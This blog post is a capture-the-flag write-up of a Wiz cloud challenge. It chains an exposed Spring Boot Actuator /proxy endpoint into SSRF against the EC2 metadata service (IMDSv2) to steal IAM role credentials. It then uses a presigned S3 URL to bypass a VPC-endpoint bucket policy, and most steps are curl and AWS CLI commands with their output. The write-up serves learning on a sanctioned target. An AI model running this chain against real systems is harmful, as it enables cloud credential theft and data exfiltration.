---
title: "Wiz x Cloud Security Championship: Perimeter Leak"
date: 2025-07-07
draft: false
summary: "Going through how I navigated through this Wiz CTF"
tags: ["Wiz", "Cloud", "Spring Boot", "Wiz x Cloud Security Championship 2025-2026", "AWS", "S3", "SSRF"]
---

## Step 1: Yo... where am I 
You are provided with the following:
```bash
You've discovered a Spring Boot Actuator application running on AWS: curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
{"status":"UP"}
user@monthly-challenge:~$
```
What is Spring Boot?

>Spring Boot helps you to create stand-alone, production-grade Spring-based applications that you can run. We take an opinionated view of the Spring platform and third-party libraries, so that you can get started with minimum fuss. Most Spring Boot applications need very little Spring configuration[^1]. 

In short, 
- Spring Boot is a popular Java framework 
- The Actuator module is enabled. 

Lets confirm the application is truly up

- Run:
```bash
curl -u 'ctf:88sPVWyC2P3p' https://challenge01.cloud-champions.com
# Welcome to the proxy server.
```
- or you can run [^2]
```bash
curl -u 'ctf:88sPVWyC2P3p' https://challenge01.cloud-champions.com/actuator/health
# {"status":"UP"}
```

## Step 2: What is going on 
>  The built-in endpoints are auto-configured only when they are available. Most applications choose exposure over HTTP, where the ID of the endpoint and a prefix of /actuator is mapped to a URL[^3].

Based on that, lets see what endpoints are exposed:
```bash
curl -u 'ctf:88sPVWyC2P3p' https://challenge01.cloud-champions.com/actuator
```
![Endpoints](1.png)
Now you see a lot of endpoints are exposed. Take your time to loop through each exposed endpoint just to see what's in it. Reading up these endpoints in the Spring Wiki can help you understand as well. Read up here - [Spring: Endpoints](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html#page-title)

Let's check the /env endpoint:

```bash
curl -u 'ctf:88sPVWyC2P3p' https://challenge01.cloud-champions.com/actuator/env
```
![Env](2.png)

Reading through this kinda sucks but eventually something jumps out at me. I have a bucket name and a EC2 user. Also indirectly telling me the app is running inside an AWS EC2 instance. Lets keep these in mind. 

## Step 3: It's never that easy
Would be a fool to not just give that a try. 
```bash
aws s3 ls s3://challenge01-470f711
# Unable to locate credentials. You can configure credentials by running "aws configure".
aws s3 ls s3://challenge01-470f711 --no-sign-request
# An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```
Welp. Let's keep going then. Doing this kinda shows that I need to find creds somewhere. 

## Step 4: Going back to the beginning -> Step 2
Looking through more of the endpoints I see Mapping[^4]. 
```bash
curl -u 'ctf:88sPVWyC2P3p' https://challenge01.cloud-champions.com/actuator/mappings
```
This was a bit hard to churn though. But eventually you will see:
![Proxy](3.png)
```bash
"predicate":"{ [/proxy], params [url]}"
```
This custom route in the mappings screamed SSRF. 

The app has an endpoint /proxy that takes a URL as input.

It's kinda like “Hey user, tell me a URL and I’ll fetch it for you!”

Whenever a server-side function fetches remote URLs based on user input, and does not restrict what it can access, it’s 
almost always exploitable.

## Step 5: Does AWS stand for AW Sh*t?
From Step 2 looking at the actuator/env path we know that there are strong indicators that the app is running inside an AWS EC2 instance.  

EC2 metadata gives us temporary credentials assigned to the instance. So is it IMDSv1 or IMDSv2[^5]? Here is a nice chart. This documentation helps: [AWS: Use the Instance Metadata Service to access instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html#instance-metadata-retrieval-examples)

| Version  | URL                                           | Auth Method           | Protection                 |
| :------- | :-------------------------------------------- | :-------------------- | :------------------------- |
| **IMDSv1** | `http://169.254.169.254/latest/meta-data/`   | None                  | Easily exploitable via SSRF |
| **IMDSv2** | `http://169.254.169.254/latest/api/token`     | Requires `PUT` + token | Prevents basic SSRF        | 

I doubt it's IMDSv1. Cause it's never that easy. 

Lets check if it's IMDSv1:
```bash
curl -s "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# HTTP error: 401 Unauthorized
```

Welp not IMDSv1, so it's IMDSv2 (remember ):
```bash
curl -X PUT "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# AQAEAL-lBwoPV1s4laoPZ7UoEZGLyTFH5NMNavj1jqbEUCEIbX_b0A==
```

Since that returned a token, then the EC2 has IMDSv2 enabled. We can use that token in the header to fetch metadata: 
This documentation will show you how to that[^6]: [AWS: Retrieve security credentials from instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-security-credentials.html)
```bash
curl -H "X-aws-ec2-metadata-token: AQAEAL-lBwoPV1s4laoPZ7UoEZGLyTFH5NMNavj1jqbEUCEIbX_b0A==" \
  https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# challenge01-5592368
```
Got the role-name, now append that to the end:
```bash
curl -H "X-aws-ec2-metadata-token: AQAEAL-lBwoPV1s4laoPZ7UoEZGLyTFH5NMNavj1jqbEUCEIbX_b0A=="  https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368

#  {
#   "Code" : "Success",
#   "LastUpdated" : "2025-07-07T18:33:32Z",
#   "Type" : "AWS-HMAC",
#   "AccessKeyId" : "ASIAxxxx",
#   "SecretAccessKey" : "JZ8exxxx",
#   "Token" : "IQoJxxxx",
#   "Expiration" : "2025-07-08T00:46:25Z"
# }
```
Aye thats what we need. Lets configure a profile to use those creds
```bash
aws configure --profile jyw
#AWS Access Key ID [None]: ASIAxxxx
#AWS Secret Access Key [None]: JZ8exxxx
#Default region name [None]: 
#Default output format [None]: 
```
We're gonna need the token as well. After you save the above edit the credentials files 
```bash
vi ~/.aws/credentials
# [jyw]
# aws_access_key_id = ASIAxxxx
# aws_secret_access_key = JZ8exxxx
# aws_session_token = IQoJxxxx
```
Validate it saved
```bash
aws sts get-caller-identity --profile jyw
# {
#     "UserId": "AROARK7LBOHXDP2J2E3DV:i-0bfc4291dd0acd279",
#     "Account": "092297851374",
#     "Arn": "arn:aws:sts::092297851374:assumed-role/challenge01-5592368/i-0bfc4291dd0acd279"
# }
```
Now im basically the EC2 instance in a way

## Step 6: Bucket time
Using the profile created above
```bash
aws s3 ls s3://challenge01-470f711 --profile jyw
#                            PRE private/
# 2025-06-18 17:15:24         29 hello.txt
aws s3 ls s3://challenge01-470f711 --profile jyw --recursive
# 2025-06-18 17:15:24         29 hello.txt
# 2025-06-16 22:01:49         51 private/flag.txt
```
I'm no genius. But I think the flag might be inside flag.txt. Let's grab it.
```bash
aws --profile jyw s3 cp s3://challenge01-470f711/private/flag.txt .
# fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```
Sad that I'm forbidden, however good to know my creds are working. Can I at least see hello.txt?
```bash
aws --profile jyw s3 cp s3://challenge01-470f711/hello.txt .
# download: s3://challenge01-470f711/hello.txt to ./hello.txt     
cat hello.txt 
# Welcome to the proxy server.
```
Yes I can.

## Step 7: Where's the poop 
Errors tells me a lot. 
We know what it is not: 
- Credential problem (I can list the bucket)
- General S3 permissions (I can read hello.txt)

So it has to be some block specifically related to that bucket/object. It could literally be any one of these:
- Bucket policies and IAM policies
- Amazon S3 ACL settings
- S3 Block Public Access settings
- Amazon S3 encryption settings
- S3 Object Lock settings
- VPC endpoint policies
- AWS Organizations policies
- CloudFront distribution access
- Access point settings[^7]

Might as well go down the list. Starting with bucket policy. 
```bash
aws --profile jyw s3api get-bucket-policy --bucket challenge01-470f711
# {
#     "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Deny\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::challenge01-470f711/private/*\",\"Condition\":{\"StringNotEquals\":{\"aws:SourceVpce\":\"vpce-0dfd8b6aa1642a057\"}}}]}"
# }
```
What this tells me is that even with valid IAM credentials, S3 only allows access to private/ objects if the request comes from a specific VPC endpoint. Since this CLI is not inside the VPC, we are getting that 403 Forbidden.

Wait a minute. Our EC2 instance running the Spring Boot app is inside the VPC. What if we let the EC2 access the file on our behalf? 
- We already have access to EC2 via the /proxy?url=... endpoint.

So, let the EC2 instance make the S3 request.

## Step 8: Presigned URLs 
What is Presigned URLs?
- A secure, temporary URL to an object in S3.
- You generate it locally, using valid credentials (like EC2 creds).
- It works even if the user accessing it is anonymous — the credentials are baked into the signature.
- Works via HTTP GET → perfect for curl.
- Bypass IAM/VPC context for the downloader — the signer (you) takes responsibility.

```bash
aws --profile jyw s3 presign s3://challenge01-470f711/private/flag.txt
# https://challenge01-470f711.s3.amazonaws.com/private/flag.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIARK7LBOHXN6LAGPDX%2F20250707%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250707T201531Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJIMEYCIQDwaDxUHTL2imqEID23XaYez4arGqDcU4RVye%2BfY0hMiAIhAKP%2BSYY1N%2F05wgj8Ft1wIKRNM8YCsNBjpwXFhGD%2BO%2BuLKrgFCH0QABoMMDkyMjk3ODUxMzc0Igx4nW2KW6mg9nxn8cgqlQXv2hycLCoMKddmp%2BH5eiBulE2oUCb7ruKo14lYJy%2FPpunobTIYJ6I7DmF5q9LDCIye2nMm%2BotOfaqTp4gNnJjqzFMiPNk5evyDfkg6PQQ9k0be1dUfMlKiLSOadKutilv7pSDpUtedYRUeJ0apQl0EPDXt85QBhqc16UoM2QDQdgI0esYXlDKnNwMioBHSi47a5%2B64xowt%2Fi4tBZtVdARxKsU32bPpfk1dWQyw4sZ5OQGt123b6yLEQfrkv9435mrQG7dpgyliteKYRG%2F1c%2F9xs8A57s%2FsJA2HmXsIUI8EGpc1hMQqZvQoTysD7MFEVV5TerG5lPey64SIy7sBf4W0wDeDv7aoCxcqdT1KfKVUY1y3pnsCkFRwRyFcP%2B2%2BodGMREFsqBeskwpl%2Fk2Y1q1m%2B6Asnaa4ALZcrPvh08k8BBecIYy0qp3ZJCugypxU%2Bf0sjUwvqY4IMbfrqul89ir%2FBigrCBHcElLEtpYDK8BahFQPZQlwAbOcPZpiVzS%2Bp3Bz1zzrnsnqWQ%2B2obZV8tj0pTdWKuW188AmT7D3s%2FdikMp7yCF%2FqiYfz0tnbm4ffyxCvICQtZOgNHSoOql6VBpxdgCSYKimRpm%2BR8ewwdltCEJeMEPO0eBJWEUuc%2BRv0Apv5cEuAoRlaaLg51e2dgieIaWr3Sqrv07W6se%2BsPB7qsiHmt7%2FtJZKbhrAYM1F3asVBvJ03rST%2F3Dmhgt3wDmeNFrbhLRhf5MVTLcYZXTEdd%2BP5S8YaEvyGykFWhvQr3NfEuupYgwOEuPwKoK49EYBrFiUf2TAwbWPfwjuMWDCoDtDT%2Bi7Fthr%2BO120GRdsOOmMDav2YNLXAxJ1HLjvbGzrKXNB3ONcVO5Mz0HsvdkBwu94TLgMK7DsMMGOrABPvW1ZRtbzOk%2BgbCGDhMDFP808eTjMzaUS2lK%2BUGfUgJ8dt4l%2BP7rzwEKASVBzn8VfdJPy%2BMjo28LngLlV46LVtnAyr%2BHRxYpB8CzNQdlrEWKWRlkLfxgknPAh7Ioq1xcznJ%2FXdTVG8ilXmpoiqwMP48uNcGqy1awRVSO5zQz8tNh2vyOmIay7SkpEjhgfftVwUmONlR9b9ZTK3u6OKWdHE9WVpQkLD4WpWrbyxIUQmY%3D&X-Amz-Signature=83e1442881618ccc32dcee8c37d4f29b53a9d84ab641f374097d352b30b28c11
```
We can pass the URL as a query string parameter
```bash
https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=<PRESIGNED_URL>
```
The URL is being passed as the value to the url= parameter.
If it contains characters like &, =, ?, they may break or truncate the parameter.

```bash
curl "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=$ENCODED"
# The flag is: WIZ_CTF_xyz 
```

[^1]: [Spring: Spring Boot](https://docs.spring.io/spring-boot/index.html)
[^2]: [Spring: Health (health)](https://docs.spring.io/spring-boot/api/rest/actuator/health.html#page-title)
[^3]: [Spring: Endpoints](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html#page-title)
[^4]: [Spring: Mappings (mappings)](https://docs.spring.io/spring-boot/api/rest/actuator/mappings.html#page-title)
[^5]: [AWS: Use the Instance metadata Service to access instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html#instance-metadata-retrieval-examples-imdsv1)
[^6]: [AWS: Retrieve security credentials from instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-security-credentials.html)
[^7]: [AWS: Troubleshoot access denied (403 Forbidden) errors in Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/troubleshoot-403-errors.html)